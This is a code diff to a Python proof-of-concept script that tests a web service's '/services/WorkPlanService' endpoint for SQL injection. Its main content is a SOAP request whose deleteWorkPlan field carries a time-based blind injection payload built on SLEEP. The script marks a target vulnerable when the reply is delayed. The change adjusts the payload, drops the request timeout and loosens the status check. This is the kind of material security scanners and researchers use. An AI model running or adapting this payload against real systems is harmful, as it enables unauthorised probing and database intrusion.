@@ -18,7 +18,7 @@ def verify(url):
       <soapenv:Body>
       <web:deleteWorkPlan>
          <!--type: string-->
-         <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(6-(IF(27=27,0,5)))))NZeo)</web:in0>
+         <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)</web:in0>
          <!--type: int-->
          <web:in1>22</web:in1> 
       </web:deleteWorkPlan>
@@ -28,8 +28,8 @@ def verify(url):
     vurl = urllib.parse.urljoin(url, "/services/WorkPlanService")
 
     try:
-        response = requests.post(vurl, headers=headers, data=data, timeout=10)
-        if response.status_code == 200 and response.elapsed.total_seconds() > 4:
+        response = requests.post(vurl, headers=headers, data=data)
+        if response.status_code and response.elapsed.total_seconds() > 4:
             relsult['vulnerable'] = True
             relsult['verify'] = vurl
         return relsult
